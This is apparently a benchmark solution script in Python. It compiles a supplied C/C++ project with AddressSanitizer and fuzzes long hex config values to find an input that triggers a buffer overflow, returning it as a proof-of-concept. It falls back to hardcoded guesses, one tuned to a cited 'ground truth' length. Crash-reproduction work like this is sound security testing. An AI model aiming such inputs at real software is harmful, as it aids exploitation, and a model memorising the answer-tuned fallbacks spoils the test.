import os
import tarfile
import tempfile
import subprocess
import shutil
import re
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=temp_dir)
            
            # Locate source root
            source_root = temp_dir
            entries = os.listdir(temp_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(temp_dir, entries[0])):
                source_root = os.path.join(temp_dir, entries[0])

            # 2. Analyze source for keys
            c_files = glob.glob(os.path.join(source_root, "**", "*.c"), recursive=True)
            cpp_files = glob.glob(os.path.join(source_root, "**", "*.cpp"), recursive=True)
            all_src = c_files + cpp_files
            
            keys = set()
            for fpath in all_src:
                try:
                    with open(fpath, 'r', errors='ignore') as f:
                        content = f.read()
                        # Extract string literals that might be config keys
                        matches = re.findall(r'"([a-zA-Z0-9_-]+)"', content)
                        for m in matches:
                            if 2 < len(m) < 25:
                                keys.add(m)
                except:
                    pass
            
            key_candidates = sorted(list(keys))
            # Add common fallback keys
            fallback_keys = ["config", "hex", "value", "key", "data", "id"]
            for k in fallback_keys:
                if k not in key_candidates:
                    key_candidates.append(k)

            # 3. Compile
            executable = None
            env = os.environ.copy()
            # Enable AddressSanitizer to detect overflows
            flags = '-fsanitize=address -g'
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            
            # Check for Makefile
            makefile_path = os.path.join(source_root, "Makefile")
            if os.path.exists(makefile_path):
                try:
                    subprocess.run(['make', 'clean'], cwd=source_root, capture_output=True)
                    subprocess.run(['make'], cwd=source_root, env=env, capture_output=True)
                except:
                    pass
            
            # Find executable produced by make
            for root, dirs, files in os.walk(source_root):
                for f in files:
                    fp = os.path.join(root, f)
                    if os.access(fp, os.X_OK) and not f.endswith(('.c', '.cpp', '.h', '.o', '.a', '.so')):
                        executable = fp
                        break
                if executable: break

            # Fallback manual compilation if make failed or no exe found
            if not executable and all_src:
                # Find file with main()
                main_src = None
                for f in all_src:
                    try:
                        with open(f, 'r', errors='ignore') as fo:
                            if "main" in fo.read():
                                main_src = f
                                break
                    except:
                        pass
                
                if main_src:
                    compiler = 'g++' if main_src.endswith('.cpp') else 'gcc'
                    out_bin = os.path.join(source_root, 'vuln_manual')
                    # Try compiling just the main file (simple challenges) or all (complex)
                    # We try main file first as it's safer for single-file PoCs
                    subprocess.run([compiler, main_src, '-o', out_bin, '-fsanitize=address', '-g'], capture_output=True)
                    if os.path.exists(out_bin):
                        executable = out_bin

            # If still no executable, we cannot verify, so return a likely payload
            if not executable:
                return b"hex_val = 0x" + b"41" * 535 + b"\n"

            # 4. Fuzz/Generate PoC
            # Strategy: The vulnerability is "long hex values".
            # Buffer is likely 512 bytes based on ground truth 547.
            # We iterate lengths starting from 512 up to 600.
            
            formats = ["{k}={v}\n", "{k} = {v}\n", "{k} {v}\n", "{k}: {v}\n"]
            
            # Optimization: Try fallback keys first if list is huge
            priority_keys = fallback_keys + key_candidates[:20]
            
            for length in range(512, 600, 1):
                # Construct hex string
                hex_str = "0x" + "A" * length
                
                for key in priority_keys:
                    for fmt in formats:
                        payload = fmt.format(k=key, v=hex_str).encode('utf-8')
                        
                        fd, path = tempfile.mkstemp()
                        os.write(fd, payload)
                        os.close(fd)
                        
                        try:
                            # Run target
                            res = subprocess.run([executable, path], capture_output=True, timeout=0.5)
                            
                            # Check crash
                            # ASAN returns non-zero and prints to stderr
                            if res.returncode != 0:
                                err = res.stderr.decode(errors='ignore')
                                if "AddressSanitizer" in err or "stack-buffer-overflow" in err or res.returncode == -11:
                                    return payload
                        except:
                            pass
                        finally:
                            if os.path.exists(path):
                                os.unlink(path)
            
            # Fallback: try raw hex without key
            for length in range(512, 600):
                payload = ("0x" + "A" * length + "\n").encode()
                fd, path = tempfile.mkstemp()
                os.write(fd, payload)
                os.close(fd)
                try:
                    res = subprocess.run([executable, path], capture_output=True, timeout=0.5)
                    if res.returncode != 0 and (b"AddressSanitizer" in res.stderr or res.returncode == -11):
                        return payload
                except:
                    pass
                finally:
                    os.unlink(path)

            # If nothing worked, return a best-guess payload
            return b"config = 0x" + b"A" * 540 + b"\n"

        except Exception:
            return b"A" * 547
        finally:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
